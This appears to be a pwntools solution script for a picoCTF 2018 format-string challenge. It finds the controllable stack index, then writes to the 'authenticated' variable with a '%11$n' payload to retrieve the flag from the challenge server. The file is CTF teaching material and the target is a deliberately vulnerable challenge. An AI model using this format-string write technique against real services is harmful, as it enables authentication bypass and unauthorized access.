#! /usr/bin/python

from pwn import *
import re

local = False

context.log_level = "critical"
str1 = "Received Unknown Input:"
str2 = "Sorry, you are not *authenticated*!"

# first lets dump the stack to see at which index we can control it, i.e., the place where our
# input will be stored which means that using %x$n we can write anything to the address in that
# location
if local: 
	try:
		for i in range(100):	
			p = process("./auth")
			p.recv()		
			p.sendline("AAAA " + "%" + str(i) +"$x")
			prompt = p.recv().replace(str1, "").replace(str2, "").replace("\n", "").strip()
			print i, prompt
			p.close()
	except:
		print i, "EOF"
else:
	# we can control index 11 (the stack contains our input)
	"""
	0 AAAA %0$x
	...
	
	11 AAAA 41414141
	...
	"""
	# now, since the binary has no PIE, we can check where is the 'authenticated' variable
	# stored : 
	# gdb > p &authenticated
	# 0x804a04c
	# finally we will pack the address and prepend to the %11$n to perform the attack
	host, port = "2018shell.picoctf.com", 27114
	p = remote(host, port)
	p.sendline(p32(0x804a04c) + "%11$n")
	prompt = p.recvall()
	
 	flag = re.findall(r"picoCTF{.*}", prompt)[0]
 	print flag
	p.close()
